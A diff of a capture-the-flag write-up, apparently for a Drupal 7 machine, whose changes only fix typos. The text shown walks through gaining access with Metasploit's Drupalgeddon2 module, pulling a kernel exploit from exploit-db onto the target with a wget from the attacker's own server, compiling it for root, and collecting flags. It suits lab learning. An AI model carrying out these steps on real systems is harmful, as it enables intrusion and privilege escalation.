@@ -15,7 +15,7 @@ Lets fire up metasploit and check if there's an exploit
 ```
 msf6 > search drupal 7
 ```
-From googling Drupal 7 exploit we find that there's an exploit called **Drupalgeddon2**
+From googling Drupal 7 exploit we find that there's an exploit called **Drupalgeddon2**.      
 Select the one with Drupalgeddon2 => **exploit/unix/webapp/drupal_drupalgeddon2**       
 You can check the requirements needed by just typing in     
 ```
@@ -40,7 +40,7 @@ I checked the kernel version on the system
 
 Googling an exploit for the version I found one on [exploit-db](https://www.exploit-db.com/exploits/40847). I downloaded this file onto my local computer and hosted a python server in that directory to wget onto the target machine.     
 
-I know downloading directly onto the taget machine would have been easier but for some reason it was not connecting to the exploit-db site.
+I know downloading directly onto the target machine would have been easier but for some reason it was not connecting to the exploit-db site.
 
 You can setup a local python server using
 ```
@@ -52,11 +52,11 @@ Download the file onto the /tmp directory
 wget http://your_ip_address:port/40847.cpp
 ```
 
-Follow the instructions in the C file to run the exploit.   
+Follow the instructions in the Cpp file to run the exploit.   
 
 After compiling and running the file, voila we are root.
 The command to compile is given in the exploit cpp file, use that.
 
 ![](images/root.png)
 
-Navigate to the root and home directory to find the flags.
+Navigate to the root and home directories to find the flags.
